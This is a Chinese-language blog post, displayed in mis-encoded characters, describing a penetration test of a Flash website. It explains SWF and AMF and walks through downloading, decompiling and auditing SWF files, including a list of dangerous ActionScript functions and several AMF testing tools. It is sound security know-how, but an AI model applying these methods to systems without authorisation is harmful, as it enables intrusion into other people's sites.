# æ¡ˆä¾‹-è®°ä¸€æ¬¡Flashç½‘ç«™æ¸—é€æµ‹è¯•



&lt;!--more--&gt;

## èƒŒæ™¯

åœ¨2025å¹´8æœˆçš„å¹³å‡¡ä¸€å¤©ï¼ŒåŽ»å®¢æˆ·çŽ°åœºè¿›è¡Œæ¸—é€æµ‹è¯•ï¼Œé‡åˆ°äº†ä¸€ä¸ªFlashç½‘ç«™ï¼Œç¼˜åˆ†å¦™ä¸å¯è¨€ã€‚FlashæŠ€æœ¯ç›®å‰å·²ç»è¢«æ·˜æ±°äº†ï¼Œå…³äºŽå®ƒçš„æ¸—é€æµ‹è¯•æŠ€æœ¯åˆ†äº«ä¸»è¦é›†ä¸­åœ¨2018å¹´ä¹‹å‰ï¼Œè¿‘ä¸¤å¹´ä¹Ÿåœ¨æŒç»­çš„æŠ¥å‡ºFlashçš„CVEã€‚

æ—¢ç„¶é‡åˆ°äº†ï¼Œé‚£å°±ä¸èƒ½ç™½å­¦ï¼ŒæŠŠè¿™ä¹±ä¸ƒå…«ç³Ÿçš„ä¸œè¥¿é‡æ–°æ•´ç†ä¸‹ï¼Œæ°´ä¸€ç¯‡æ–‡ç« ä¹Ÿè¿˜æ˜¯å¯ä»¥çš„ã€‚å‚è€ƒæ–‡ç« éƒ½æ”¾åœ¨ä¸‹é¢ï¼Œå¤§éƒ¨åˆ†éƒ½æ˜¯è‹±æ–‡çš„ï¼Œæœ¬æ–‡ä¸­æœ‰å¾ˆå¤šæ˜¯æ¥è‡ªå‚è€ƒæ–‡ç« ä¸­çš„ç¿»è¯‘éƒ¨åˆ†ã€‚

&gt; [!note]
&gt;
&gt; ä¸ºäº†å†™æ–‡ç« ï¼ŒæŸ¥äº†å¤§é‡èµ„æ–™åŽ»äº†è§£ç›¸å…³çŸ¥è¯†ã€‚æˆ‘åœ¨äº‹åŽæŸ¥é˜…èµ„æ–™æ—¶ï¼Œåœ¨wooyun dropsä¸­å‘çŽ°äº†å¤§é‡ç›¸å…³æ–‡ç« ï¼Œé‚£éƒ½æ˜¯12ã€13å¹´çš„ä¸œè¥¿ï¼Œæ²¡æƒ³åˆ°è¿˜èƒ½ç”¨ä¸Šã€‚
&gt;
&gt; æˆ‘ä¸æƒ³ä¸ºè¿™ä¸ªè¿‡æ—¶çš„ï¼Œå°‘è§çš„åœºæ™¯èŠ±è´¹å¤ªå¤šæ—¶é—´ï¼Œæ‰€ä»¥å¾ˆå¤šåœ°æ–¹å¯èƒ½éƒ½ä¸åˆ°ä½ï¼Œè¯·å¤§å®¶è°…è§£ã€‚

å…ˆè®²æµ‹è¯•ç»“æžœ
ç½‘ç«™åŸºäºŽFlashæŠ€æœ¯ï¼Œå­˜åœ¨å¤§é‡ swf æ–‡ä»¶ï¼Œæ•°æ®äº¤äº’ä½¿ç”¨ amf è¿›è¡Œä¼ è¾“ã€‚æœ¬æ¬¡æ¶‰åŠçš„æ¼æ´žæœ‰ï¼š

- SQLæ³¨å…¥
- æœªæŽˆæƒ
- ä¿¡æ¯æ³„éœ²
- ååºåˆ—åŒ–ï¼ˆç–‘ä¼¼ï¼‰

## FlashæŠ€æœ¯

&gt;  Flashæ˜¯ä¸€ç§åŸºäºŽçŸ¢é‡å›¾å½¢çš„äº¤äº’å¼å¤šåª’ä½“æŠ€æœ¯ï¼Œæœ¬èº«æ˜¯ä»ŽFuture Splashå‘å±•èµ·æ¥çš„ã€‚åŽè¢«Macromediaå…¬å¸æ”¶è´­å¹¶ç»§ç»­å‘å±•å…¶åˆ¶ä½œåŠ¨ç”»ä¸°å¯Œå¤šé‡‡ï¼Œå¯ŒäºŽå˜åŒ–æ€§å¹¶ä¸”ç›¸å¯¹äºŽå…¶ä»–ä½œå›¾è½¯ä»¶æ–‡ä»¶è¾ƒå°ï¼Œåœ¨ç½‘é¡µä¸­æ— é¡»ç­‰å®ƒä¸‹è½½å®Œæ¯•å°±å¯ä»¥æ˜¾ç¤ºå‡ºæ¥å¹¶ä»¥æµçš„å½¢å¼æ’­æ”¾ï¼Œå”¯ä¸€çš„ç¼ºç‚¹æ˜¯éœ€è¦ç‰¹å®šçš„æµè§ˆå™¨æ’ä»¶æ¥æ”¯æŒï¼Œç›®å‰æ‰€æœ‰çš„æµè§ˆå™¨éƒ½æ”¯æŒFlashï¼Œæˆ–è€…è¯´éƒ½å¯ä»¥å®‰è£…Flashçš„æ’­æ”¾å™¨æ’ä»¶ã€‚ 
&gt;
&gt; FlashåŒ…æ‹¬è¿è¡Œæ—¶ï¼ˆè™šæ‹Ÿæœºæˆ–è€…å«æ’­æ”¾å™¨ï¼‰ï¼Œæ’­æ”¾æ–‡ä»¶ï¼ˆSWFï¼‰ï¼Œå•†æ ‡ï¼Œåˆ›ä½œå·¥å…·ç­‰è¯¸å¤šæ„æ€ï¼ŒActionScriptç³»FlashPlayerä¸­å¯ä»¥ä½¿ç”¨çš„ç¼–ç¨‹è¯­è¨€ï¼Œä¹Ÿæ˜¯å”¯ä¸€çš„ç¼–ç¨‹è¯­è¨€ã€‚çŽ°åœ¨çš„ç‰ˆæœ¬æ˜¯AS3ï¼Œæ€§èƒ½è¾ƒä»¥å‰çš„AS2æœ‰å¾ˆå¤§æé«˜ï¼Œè€Œä¸”ï¼Œè¯­è¨€æœ¬èº«æŠ½è±¡å¾—æ›´åƒä¸€é—¨ç¼–ç¨‹è¯­è¨€ã€‚ 

Flashæ˜¯ä¸€ä¸ªå¹¿æ³›åº”ç”¨äºŽç½‘é¡µåŠ¨ç”»ã€æ¸¸æˆå¼€å‘å’Œç§»åŠ¨åº”ç”¨å¼€å‘çš„å¹³å°ï¼Œä¾èµ–äºŽActionScriptç¼–ç¨‹è¯­è¨€å’ŒFlash Playerã€‚ActionScriptæ˜¯ä¸€ç§åŸºäºŽECMAScriptçš„é¢å‘å¯¹è±¡ç¼–ç¨‹è¯­è¨€ï¼Œä¸“é—¨ç”¨äºŽå¼€å‘Flashå†…å®¹ã€‚ æ–‡ä»¶åŽç¼€ä¸º asï¼Œå’Œ JavaScriptæœ‰ç‚¹åƒ

Flashçš„å®‰å…¨æœºåˆ¶æ˜¯å…¶æž¶æž„ä¸­æœ€ä¸ºå…³é”®çš„ç»„æˆéƒ¨åˆ†ä¹‹ä¸€ï¼Œå®ƒæ—¨åœ¨ä¸ºç”¨æˆ·æä¾›ä¸€ä¸ªå®‰å…¨ç¨³å®šçš„è¿è¡ŒçŽ¯å¢ƒã€‚åœ¨Flashä¸­ï¼Œå®‰å…¨æœºåˆ¶çš„ç†è®ºåŸºç¡€å»ºç«‹åœ¨ä»¥ä¸‹å‡ ä¸ªæ ¸å¿ƒæ¦‚å¿µä¸Šï¼š

- æ²™ç›’æ¨¡åž‹ï¼ˆSandbox Modelï¼‰ ï¼šä¸ºFlashåº”ç”¨ï¼ˆå°¤å…¶æ˜¯æ¥è‡ªä¸åŒæºçš„åº”ç”¨ï¼‰æä¾›äº†éš”ç¦»çš„è¿è¡ŒçŽ¯å¢ƒï¼Œé™åˆ¶äº†åº”ç”¨å¯¹æœ¬åœ°ç³»ç»Ÿèµ„æºçš„è®¿é—®ï¼Œç¡®ä¿äº†ä¸åŒåº”ç”¨ä¹‹é—´çš„ç‹¬ç«‹æ€§å’Œå®‰å…¨æ€§ã€‚

- ç­–ç•¥æ–‡ä»¶ï¼ˆPolicy Filesï¼‰ ï¼šç”¨äºŽæŽ§åˆ¶åº”ç”¨ç¨‹åºçš„ç½‘ç»œè®¿é—®æƒé™ã€‚ç­–ç•¥æ–‡ä»¶å®šä¹‰äº†å“ªäº›åŸŸå¯ä»¥ä¸ŽFlashåº”ç”¨é€šä¿¡ï¼Œä»Žè€Œé™å®šäº†åº”ç”¨çš„ç½‘ç»œè®¿é—®èŒƒå›´ã€‚

- å®‰å…¨è¯ä¹¦ï¼ˆCertificatesï¼‰ ï¼šç”¨äºŽéªŒè¯åº”ç”¨çš„å¯ä¿¡æ€§ï¼Œç¡®ä¿äº†Flashåº”ç”¨çš„æ¥æºå¯é ï¼Œé˜²æ­¢æ¶æ„è½¯ä»¶çš„æ”»å‡»ã€‚




### åŸºæœ¬ç»„ä»¶å’Œåè®®

### ActionScriptè™šæ‹Ÿæœº

ActionScriptè™šæ‹Ÿæœºæ˜¯Flashå¹³å°ä¸Šçš„ä¸€ä¸ªå…³é”®ç»„ä»¶ï¼Œå®ƒè´Ÿè´£è§£é‡Šå’Œæ‰§è¡ŒActionScriptä»£ç ã€‚ActionScriptæ˜¯ä¸€ç§åŸºäºŽECMAScriptçš„
ç¼–ç¨‹è¯­è¨€ï¼Œä¸“ä¸ºFlashçŽ¯å¢ƒè®¾è®¡ï¼Œæä¾›äº†ä¸°å¯Œçš„äº‹ä»¶å¤„ç†ã€é¢å‘å¯¹è±¡ç¼–ç¨‹å’Œç½‘ç»œåŠŸèƒ½ã€‚

ActionScriptè™šæ‹Ÿæœºçš„æœºåˆ¶ä¸»è¦åŒ…æ‹¬ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

- å­—èŠ‚ç è§£é‡Šæ‰§è¡Œï¼šActionScriptä»£ç é¦–å…ˆè¢«ç¼–è¯‘æˆå­—èŠ‚ç ï¼Œè™šæ‹Ÿæœºé€šè¿‡è§£é‡Šå™¨é€è¡Œè¯»å–å¹¶æ‰§è¡Œè¿™äº›å­—èŠ‚ç ã€‚
- å³æ—¶ç¼–è¯‘ï¼ˆJITï¼‰æŠ€æœ¯ï¼šåœ¨Flash Playerçš„è¾ƒæ–°ç‰ˆæœ¬ä¸­å¼•å…¥ï¼Œå¯å°†ç»å¸¸æ‰§è¡Œçš„ä»£ç æ®µç¼–è¯‘ä¸ºæ›´é«˜æ•ˆçš„æœ¬åœ°æœºå™¨ç ï¼Œå‡å°‘è§£é‡Šæ‰§è¡Œ
  çš„å¼€é”€ï¼Œæé«˜æ€§èƒ½ã€‚
- åžƒåœ¾å›žæ”¶æœºåˆ¶ï¼šè‡ªåŠ¨ç®¡ç†å†…å­˜ï¼Œå®šæœŸæ¸…ç†ä¸å†ä½¿ç”¨çš„å¯¹è±¡ï¼Œé˜²æ­¢å†…å­˜æ³„æ¼ã€‚

### SWFæ–‡ä»¶æ ¼å¼

SWF æ–‡ä»¶æ ¼å¼ï¼Œæ˜¯ Adobe Flash Player æ‰€ä½¿ç”¨çš„æ–‡ä»¶æ ¼å¼ï¼Œå¹¿æ³›åº”ç”¨äºŽç½‘ç»œåŠ¨ç”»å’Œå¯Œåª’ä½“å†…å®¹çš„å±•ç¤ºã€‚åŠ¨æ€åŠ è½½SWF æ–‡ä»¶æ„å‘³ç€åœ¨è¿è¡Œæ—¶ä»ŽæœåŠ¡å™¨ä¸‹è½½å¹¶å±•ç¤ºFlashå†…å®¹ï¼Œè¿™å¯¹äºŽå‡å°‘åˆå§‹åŠ è½½æ—¶é—´å’Œæä¾›æ¨¡å—åŒ–å†…å®¹è‡³å…³é‡è¦ã€‚

SWFæ–‡ä»¶ä»Žä¸€ä¸ª16å­—èŠ‚çš„æ–‡ä»¶å¤´å¼€å§‹ï¼ŒåŒ…å«äº†å…³äºŽæ–‡ä»¶çš„å…ƒæ•°æ®ï¼Œæ¯”å¦‚ç‰ˆæœ¬ä¿¡æ¯ã€å¸§å°ºå¯¸ã€å¸§é¢‘å’Œå¸§æ•°ã€‚ç´§éšå…¶åŽçš„æ˜¯ä¸€ç³»åˆ—æ ‡è®°ï¼ˆTagï¼‰ï¼Œè¿™äº›æ ‡è®°å®šä¹‰äº†SWFæ–‡ä»¶çš„å…¶ä½™éƒ¨åˆ†ï¼Œå¦‚å®šä¹‰å½¢çŠ¶ã€æ–‡æœ¬ã€ä½å›¾ã€å£°éŸ³ä»¥åŠåŠ¨ä½œè„šæœ¬ä»£ç ã€‚



### AMFåè®®

AMFï¼ˆAction Message Formatï¼‰æ˜¯ä¸€ç§äºŒè¿›åˆ¶çš„æ•°æ®æ ¼å¼ï¼Œå³æ•°æ®ï¼ˆactionscripté‡Œé¢çš„Object, Array, Boolean, Numberç­‰ï¼‰ç»è¿‡äº†åºåˆ—åŒ–æˆäºŒè¿›åˆ¶ã€‚

- AMF æ˜¯ Adobe æå‡ºçš„äºŒè¿›åˆ¶åºåˆ—åŒ–åè®®
- ä¸»è¦ç”¨äºŽ Flash/Flex å’ŒæœåŠ¡å™¨é—´é«˜æ•ˆä¼ è¾“æ•°æ®
- æ”¯æŒå¤æ‚å¯¹è±¡ã€æ•°ç»„ã€XMLã€æ—¥æœŸç­‰æ•°æ®ç±»åž‹

æœ‰amf0å’Œamf3ï¼Œå½“æ•°æ®æµä¸­æœ‰0Ã—11æ ‡è®°æ—¶ï¼Œè¡¨ç¤ºè¿™ä¸ªæ•°æ®å±žäºŽAMF3ã€‚

AMFåŸºäºŽHTTPåè®®ï¼Œå¤§è‡´å¤„ç†è¿‡ç¨‹ï¼š  
èŽ·å–å®¢æˆ·ç«¯è¯·æ±‚ï¼ˆrequestï¼‰ - æœåŠ¡ç«¯ååºåˆ—åŒ–è¯·æ±‚ - å¤„ç†è¯·æ±‚ - åºåˆ—åŒ–å“åº”ï¼ˆresponseï¼‰ - è¿”å›žhttpå“åº”ç»™å®¢æˆ·ç«¯

ç›¸å…³å·¥å…·å’Œåº“

- Adobe Flex SDK
- Javaçš„ BlazeDS
- PHPçš„ AMFPHP

## SWFæ¸—é€

ä»¥ä¸‹æ˜¯æˆ‘æ‰¾åˆ°çš„ä¸€äº›å‚è€ƒæ–‡ç« ï¼š

- [æŽ¢å¯»Flash SWFä¸­çš„æ¼æ´ž](https://xz.aliyun.com/news/3051) â€”â€” å…ˆçŸ¥çš„ç¿»è¯‘æ–‡ï¼ŒåŽŸæ–‡ï¼šhttp://10degres.net/testing-flash-swf/
- [Analysing SWF files for vulnerabilities](https://ret2libc.wordpress.com/2016/04/04/analysing-swf-files-for-vulnerabilities/)
- [Finding vulnerabilities in SWF files (v2.0)](http://media.wix.com/ugd/533dd4_c096c1fa67814318acb84d41a04fb258.pdf)
- [ä¸€æ¬¡ SWF XSS æŒ–æŽ˜å’Œåˆ©ç”¨](https://cn-sec.com/archives/321701.html)ï¼Œ ä¹Œäº‘ drops



å¯¹äºŽSWFæ–‡ä»¶çš„æ¸—é€æµ‹è¯•ï¼Œæˆ‘æ€»ç»“ä¸ºä»¥ä¸‹æ­¥éª¤ï¼š

1. ä¸‹è½½swfæ–‡ä»¶å¹¶ä¿å­˜ï¼›
2. åç¼–è¯‘SWFæ–‡ä»¶ï¼Œå¹¶å¯¼å‡º
3. å¯¹å¯¼å‡ºåŽçš„ actionScript ä»£ç è¿›è¡Œä»£ç å®¡è®¡
4. éªŒè¯æ¼æ´žæ˜¯å¦å¯åˆ©ç”¨

å¯èƒ½å­˜åœ¨çš„æ¼æ´žï¼š

- Cross-site scripting ï¼ŒXSSæ”»å‡»
- Cross-site data hijacking (XSDH?) ï¼Œè·¨ç«™æ•°æ®åŠ«æŒ
- Same Origin Method Execution (SOME)  ï¼ŒåŒæºæ–¹å¼æ‰§è¡Œæ”»å‡»
- Open redirectionsï¼Œå¼€æ”¾é‡å®šå‘
- Information disclosureï¼Œä¿¡æ¯æ³„éœ²ï¼Œå¦‚ç”¨æˆ·å¯†ç å‡­æ®ã€éšè—çš„urlç­‰
- Spoofing/Defacement via loading remote objects ï¼ŒåŠ è½½è¿œç¨‹å¯¹è±¡è¿›è¡Œæ¬ºè¯ˆä¼ªé€ ï¼Œæˆ‘ç†è§£ç±»ä¼¼CSRFé‚£ç§
- Log forgingï¼Œæ—¥å¿—ä¼ªé€ æ”»å‡»ï¼ˆå¤§å¤šæ•°æƒ…å†µä¸‹ä¸å¤ªé‡è¦ï¼‰

### æµ‹è¯•å·¥å…·

- [ffdec: JPEXS Free Flash Decompiler](https://github.com/jindrapetrik/jpexs-decompiler)ï¼š ä¸€ä¸ªå…è´¹å¼€æºçš„ .SWF åç¼–è¯‘è½¯ä»¶ï¼Œåœ¨Windowsã€Linuxã€Macä¸Šéƒ½èƒ½ç”¨ï¼Œéœ€è¦ Java 8æˆ–æ›´é«˜ç‰ˆæœ¬çŽ¯å¢ƒã€‚ç”¨äºŽåç¼–è¯‘SWFæ–‡ä»¶ï¼Œè¯»å–æºä»£ç å¹¶å°†å…¶å®Œå…¨å¯¼å‡ºï¼Œæ›´å¤šå†…å®¹è§ [wikiæ–‡æ¡£](https://github.com/jindrapetrik/jpexs-decompiler/wiki)ï¼›
-  [Flash Player](https://www.flash.cn/download)ï¼š Flashæ’­æ”¾å™¨ï¼Œéœ€åœ¨JPEXSä¸­é…ç½®ã€‚ 
- [Flash Player è°ƒè¯•å™¨](https://www.flash.cn/support/debug-downloads)ï¼šFlashæ’­æ”¾å™¨çš„debugç‰ˆæœ¬ï¼Œéœ€åœ¨JPEXSä¸­é…ç½®ã€‚  

ä¸Šé¢è®²çš„éƒ½æ˜¯WindowsçŽ¯å¢ƒä¸‹çš„ï¼Œå¦‚æžœè¦åœ¨Linuxå’ŒMACçŽ¯å¢ƒï¼Œå¯ä»¥åŽ»ä»¥ä¸‹å‡ ä¸ªåœ°æ–¹ä¸‹è½½
- [githubå¤‡ä»½åº“](https://github.com/Grubsic/Adobe-Flash-Player-Debug-Downloads-Archive)
- [Adobe Flash Player Support Center](https://web.archive.org/web/20220401020702/https://www.adobe.com/support/flashplayer/debug_downloads.html)

è‡ªåŠ¨å®¡è®¡å·¥å…·ï¼š

- [OWASP SWFIntruder](https://code.google.com/archive/p/swfintruder/downloads)ï¼šOWASP æŽ¨å‡ºçš„ SWF å®‰å…¨æµ‹è¯•å·¥å…·ï¼Œå¯åˆ†æž SWF ä¸ŽæœåŠ¡å™¨çš„é€šä¿¡ï¼ˆå¦‚ AMF åè®®äº¤äº’ï¼‰ï¼Œæ£€æµ‹å‚æ•°æ³¨å…¥ã€æœªæŽˆæƒè®¿é—®ç­‰æ¼æ´žã€‚ *ä¸å¤ªä¼šç”¨ï¼Œæ²¡ç”¨æ˜Žç™½*
- SWFScanï¼šèƒ½åç¼–è¯‘ SWF æ–‡ä»¶ï¼Œè¿˜å†…ç½®äº†å®‰å…¨å®¡è®¡æ¨¡å—ï¼Œå¯è‡ªåŠ¨æ£€æµ‹ SWF ä¸­çš„å¸¸è§æ¼æ´žï¼ˆå¦‚ XSS é£Žé™©ã€æœ¬åœ°å­˜å‚¨æ»¥ç”¨ã€ä¸å®‰å…¨çš„ AMF é€šä¿¡ç­‰ï¼‰ã€‚æ”¯æŒç›´æŽ¥åˆ†æž SWF äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œé€‚åˆæ²¡æœ‰æºä»£ç æ—¶çš„é»‘ç›’å®¡è®¡ï¼Œèƒ½è¯†åˆ«å±é™©å‡½æ•°è°ƒç”¨å’Œé…ç½®ç¼ºé™·ã€‚*åŽŸåœ°å€å¤±æ•ˆï¼Œç›®å‰èƒ½æ‰¾åˆ°çš„[ä¸‹è½½åœ°å€åœ¨è¿™](https://www.52pojie.cn//forum.php?mod=viewthread&amp;tid=127768&amp;highlight=SWFScan)*



### æµ‹è¯•è¿‡ç¨‹

#### **1ã€ä¸‹è½½swfæ–‡ä»¶**

æˆ‘æ—¥å¸¸ä½¿ç”¨Burpè¿›è¡Œæ¸—é€æµ‹è¯•ï¼Œç”¨å…¶ä»–çš„ä»£ç†æŠ“åŒ…å·¥å…·æ•ˆæžœä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚

æŠ“åŒ…æ‰¾åˆ°ä¸‹è½½swfæ–‡ä»¶çš„è¿žæŽ¥ï¼Œåœ¨Burpä¸­å³é”®å¦å­˜ä¸ºï¼Œä¿å­˜åˆ°æœ¬åœ°çš„xxx.swfæ–‡ä»¶ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨wget/curlç›´æŽ¥ä¸‹è½½

```sh
wget &lt;url&gt;
curl &lt;url&gt; --output xxx.swf
```

æ ¹æ®ç½‘ç«™æž¶æž„ï¼Œæœ‰äº›å¯èƒ½æ˜¯ä¸€ä¸ªä¸»ç•Œé¢swfåŽ»åŠ è½½å­æ¨¡å—swfï¼Œæœ‰äº›å°±æ˜¯å•ç‹¬çš„swfï¼Œå¯èƒ½è¦ä¸‹è½½çš„æ–‡ä»¶æ¯”è¾ƒå¤šã€‚

#### **2ã€åç¼–è¯‘ swf æ–‡ä»¶**

ä½¿ç”¨ JPEXS Free Flash Decompilerï¼ˆffdecï¼‰æ‰“å¼€è¯¥swfæ–‡ä»¶è¿›è¡Œåç¼–è¯‘ã€‚

åç¼–è¯‘åŽé¡µé¢å¦‚ä¸‹ï¼Œè½¯ä»¶é»˜è®¤æ˜¯è‹±æ–‡é¡µé¢ï¼Œå¯ä»¥åœ¨ â€œsettingâ€ - â€œchange languageâ€ å¤„ä¿®æ”¹ä¸ºç®€ä¸­ã€‚

![image-20250817152104211](resource/index.assets/image-20250817152104211.png)

**å¯¼å‡ºæ–‡ä»¶**

è™½ç„¶ ffdec æ”¯æŒæŸ¥çœ‹å’Œä¿®æ”¹ actionScript ä»£ç æ–‡ä»¶ï¼Œä½†æ˜¯è¿˜æ˜¯å»ºè®®å°†æ–‡ä»¶å¯¼å‡ºåˆ°æœ¬åœ°ç»Ÿä¸€è¿›è¡Œå®¡è®¡æ¯”è¾ƒæ–¹ä¾¿ã€‚

å¯¼å‡ºæ–¹å¼éžå¸¸æœ´ç´ ï¼Œ`Ctrl &#43; A` å…¨é€‰åŽï¼Œå³é”®å¯¼å‡ºå·²é€‰ï¼Œä¿å­˜åˆ°æŒ‡å®šç›®å½•ä¸­

ä¹Ÿå¯ä»¥é€šè¿‡å¯¼å‡ºåŠŸèƒ½ï¼Œå¯¼å‡ºä¸º VS Code å·¥ç¨‹ æˆ– IDEAå·¥ç¨‹ï¼ŒåŒºåˆ«åº”è¯¥ä¸å¤§ã€‚

![image-20250817153629891](resource/index.assets/image-20250817153629891.png)

#### 3ã€ä»£ç å®¡è®¡

**è‡ªåŠ¨å®¡è®¡**

å¯é€šè¿‡ swfscan è¿›è¡Œä»£ç å®¡è®¡

å®‰è£…swfscanéœ€è¦å…ˆå®‰è£… `.NET Framework 2.0`ï¼Œ

![image-20250825230416138](resource/index.assets/image-20250825230416138.png)

å¯ä»¥é€šè¿‡ ã€æŽ§åˆ¶é¢æ¿ã€‘-ã€ç¨‹åºã€‘-ã€å¯åŠ¨æˆ–å…³é—­ WindowsåŠŸèƒ½ã€‘-é€‰æ‹©å¯ç”¨`.NET Framework 3.5ï¼ˆåŒ…æ‹¬.NET 2.0å’Œ3.0ï¼‰`ã€‚

![image-20250825231309832](resource/index.assets/image-20250825231309832.png)

SWFScanç”¨æ³•ï¼š

1. é€‰æ‹©ç›¸åº”çš„swfæ–‡ä»¶æœ¬åœ°ä½ç½®æˆ–URL
2. ç‚¹å‡» Get å¯¹swfæ–‡ä»¶è¿›è¡Œåç¼–è¯‘
3. ç‚¹å‡»Analyzeè¿›è¡Œä»£ç å®¡è®¡ï¼Œåˆ†æžå¯èƒ½å­˜åœ¨çš„æ¼æ´žï¼Œæ¼æ´žç»Ÿè®¡æ•°æ®æ˜¾ç¤ºåœ¨å³ä¸‹æ–¹ï¼Œå¦‚å›¾ï¼š

![image-20250825232800408](resource/index.assets/image-20250825232800408.png)



**æ‰‹åŠ¨å®¡è®¡**

1. æŸ¥æ‰¾æ•æ„Ÿä¿¡æ¯ï¼šå¯†ç hashã€AccessTokenã€AccessKeyã€æ•æ„Ÿè¯ã€APIæŽ¥å£ã€URIç­‰ä¿¡æ¯

   å‚è€ƒæ–‡ç« ä¸­æœ‰ç”¨ [extract-endpoints](https://github.com/gwen001/extract-endpoints) çš„ï¼š è¿™ä¸ª PHP å·¥å…·ä¼šå¯¹æ–‡ä»¶æˆ–é€’å½’åœ°å¯¹ç›®å½•åº”ç”¨æ­£åˆ™è¡¨è¾¾å¼ï¼Œä»¥æå–ç«¯ç‚¹ã€‚è¿™å¯¹äºŽä»Ž JavaScript æ–‡ä»¶ä¸­æŸ¥æ‰¾ API ç½‘å€éžå¸¸æœ‰ç”¨ã€‚ä½†æ˜¯ï¼Œæ‰€æœ‰ç±»åž‹çš„æºæ–‡ä»¶éƒ½å¯ä»¥è¢«è§£æžï¼ˆHTMLã€PHPã€JavaScriptã€Java ç­‰ï¼‰ã€‚

   æˆ‘ç”¨çš„æ˜¯è‡ªå·±åŸºäºŽ HAE æ­£åˆ™å†™çš„å°è„šæœ¬ï¼Œç”¨æ¥æŒ–æŽ˜æ•æ„Ÿä¿¡æ¯çš„ã€‚

2. æŸ¥æ‰¾å±é™©å‡½æ•°

   ```
   loadVariables()
   getURL()
   getURLBlankVar()
   getURLParentVar()
   getURLJSParam()
   loadMovie()
   loadMovieVar()
   loadMovieNum()
   FScrollPane.loadScrollContent()
   LoadVars.load 
   LoadVars.send 
   XML.load ( &#39;url&#39; )
   XML.sendAndLoad ( &#39;url&#39; )
   LoadVars.load ( &#39;url&#39; )
   LoadVars.send ( &#39;url&#39; ) 
   Sound.loadSound( &#39;url&#39; , isStreaming );
   NetStream.play( &#39;url&#39; );
   flash.external.ExternalInterface.call(_root.callback)
   externalInterface.addCallback
   htmlText
   htmlVar
   loadClip
   AddDLL
   ```

3. è·Ÿç€å‡½æ•°æ‰¾è°ƒç”¨è·¯å¾„

#### 4ã€æ¼æ´žéªŒè¯

å¯¹ä»£ç å®¡è®¡çš„ç»“æžœè¿›è¡ŒéªŒè¯ï¼Œå…¶å®žä¹Ÿå¯ä»¥ç®—ä½œä»£å®¡ä¸­çš„ä¸€æ­¥ã€‚

é€šè¿‡Flashæµè§ˆå™¨ï¼Œé…åˆ ffdec çš„è°ƒè¯•åŠŸèƒ½è¿›è¡ŒéªŒè¯ã€‚




## AMFæ¸—é€

[[AMFæ¸—é€æµ‹è¯•]]

AMFï¼ˆAction Message Formatï¼‰æ˜¯ä¸€ç§äºŒè¿›åˆ¶çš„æ•°æ®æ ¼å¼ï¼Œå³æ•°æ®ï¼ˆactionscripté‡Œé¢çš„Object, Array, Boolean, Numberç­‰ï¼‰ç»è¿‡äº†åºåˆ—åŒ–æˆäºŒè¿›åˆ¶ã€‚

- AMF æ˜¯ Adobe æå‡ºçš„äºŒè¿›åˆ¶åºåˆ—åŒ–åè®®
- ä¸»è¦ç”¨äºŽ Flash/Flex å’ŒæœåŠ¡å™¨é—´é«˜æ•ˆä¼ è¾“æ•°æ®
- æ”¯æŒå¤æ‚å¯¹è±¡ã€æ•°ç»„ã€XMLã€æ—¥æœŸç­‰æ•°æ®ç±»åž‹

AMFåŸºäºŽHTTPåè®®ï¼ŒæœåŠ¡ç«¯å¤§è‡´å¤„ç†è¿‡ç¨‹ï¼š 

1. HTTP Requestï¼šæœåŠ¡ç«¯æŽ¥æ”¶åˆ°æ¥è‡ªå®¢æˆ·ç«¯çš„httpè¯·æ±‚ï¼ˆrequestï¼‰ï¼Œå¹¶ä»Žä¸­èŽ·å–è¯·æ±‚ä½“å†…å®¹ï¼ˆAMFæ•°æ®ï¼‰
2. ååºåˆ—åŒ–ï¼šæœåŠ¡ç«¯å°†è¯·æ±‚ä½“å†…å®¹ï¼ˆAMFæ•°æ®ï¼‰ååºåˆ—åŒ–ä¸º ActionScript å¯¹è±¡
3. å¤„ç†è¯·æ±‚ï¼šæœåŠ¡ç«¯æ ¹æ®è¯· ActionScript å¯¹è±¡å¤„ç†è¯·æ±‚ï¼Œè°ƒç”¨æ‰§è¡Œç›¸åº”çš„æœåŠ¡ã€æ–¹æ³•ï¼Œæ ¹æ®ç›¸åº”çš„æœåŠ¡ã€æ–¹æ³•çš„å®šä¹‰ï¼Œè¿”å›žæ‰§è¡Œç»“æžœï¼ˆä¹Ÿæ˜¯ActionScript å¯¹è±¡ï¼‰
4. åºåˆ—åŒ–ï¼šå°†å¤„ç†ç»“æžœï¼ˆActionScript å¯¹è±¡ï¼‰åºåˆ—åŒ–ä¸ºå“åº”ä½“å†…å®¹ï¼ˆAMFæ•°æ®ï¼‰
5. HTTP Responseï¼šæœåŠ¡å™¨è¿”å›žhttpå“åº”ï¼ˆresponseï¼‰ç»™å®¢æˆ·ç«¯



### æµ‹è¯•å·¥å…·

ä¸»è¦æ˜¯å¯¹AMFæ•°æ®è¿›è¡Œåºåˆ—åŒ–ååºåˆ—åŒ–çš„ç”¨é€”ï¼Œä¸‹é¢æ˜¯ä¸€äº›Burpçš„æ’ä»¶

- [AMFDSer-ngng](https://github.com/nccgroup/AMFDSer-ngng)  
- [AMFDserBurp2020-12](https://github.com/ConnorSnee/AMFDserBurp2020-12) ç”¨äºŽè®©Burpä¸ŽFlashåº”ç”¨ç¨‹åºååŒå·¥ä½œçš„Burpæ‰©å±•ã€‚
- [BurpAMFDser](https://github.com/khai-tran/BurpAMFDser)ï¼šå®ƒå€ŸåŠ©[Xtreamåº“](http://xstream.codehaus.org/)å®žçŽ°AMFè¯·æ±‚å’Œå“åº”ä¸ŽXMLä¹‹é—´çš„ååºåˆ—åŒ–ã€‚è¿˜ä½¿ç”¨äº†Kenneth Hillçš„[JMeteræºä»£ç ](https://github.com/steeltomato/jmeter-amf)çš„ä¸€éƒ¨åˆ†æ¥è¿›è¡Œè‡ªå®šä¹‰AMFååºåˆ—åŒ–
